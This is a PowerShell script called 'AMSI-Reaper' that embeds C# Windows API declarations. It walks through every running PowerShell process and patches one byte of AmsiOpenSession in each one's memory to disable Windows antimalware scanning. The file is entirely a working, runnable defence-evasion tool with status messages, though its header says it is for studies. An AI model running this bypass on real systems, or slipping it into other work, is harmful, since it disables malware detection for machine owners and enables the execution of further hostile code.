# --------------------------- #
#    About the AMSI-Reaper    #
# --------------------------- #
#    Developed by: H0ru       #
#    Developed for studies!   #
# --------------------------- #

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class AMSIReaper
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@

function ModAMSI($processId)
{
    $patch = [byte]0xEB

    $hHandle = [AMSIReaper]::OpenProcess([AMSIReaper]::PROCESS_VM_OPERATION -bor [AMSIReaper]::PROCESS_VM_READ -bor [AMSIReaper]::PROCESS_VM_WRITE, $false, $processId)
    if ($hHandle -ne [System.IntPtr]::Zero)
    {
        Write-Host "[+] Process opened with Handle ~> $hHandle"
    }

    $amsiDLL = [AMSIReaper]::LoadLibrary("amsi.dll")
    if ($amsiDLL -ne [System.IntPtr]::Zero)
    {
        Write-Host "[+] amsi.dll located at ~> $amsiDLL"
    }

    $amsiOpenSession = [AMSIReaper]::GetProcAddress($amsiDLL, "AmsiOpenSession")
    if ($amsiOpenSession -ne [System.IntPtr]::Zero)
    {
        Write-Host "[+] AmsiOpenSession located at ~> $amsiOpenSession"
    }

    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)
    Write-Host "[+] Trying to Inject ~> $patchAddr"

    $bytesWritten = 0
    $result = [AMSIReaper]::WriteProcessMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)
    if ($result)
    {
        Write-Host "[!] Process Memory Injected!"
    }

    [AMSIReaper]::CloseHandle($hHandle)
}

function ModAllPShells
{
    $processes = Get-Process
    foreach ($proc in $processes)
    {
        $name = $proc.ProcessName
        if ($name -eq "powershell")
        {
            $processId = $proc.Id
            Write-Host ""
            Write-Host "# ----------------- [STATUS] ----------------- #"
            Write-Host "[!] Injection process PowerShell with PID: $processId"
            ModAMSI $processId
        }
    }
}

Write-Host "[>] AMSI-Reaper written in PowerShell, by H0ru"
ModAllPShells
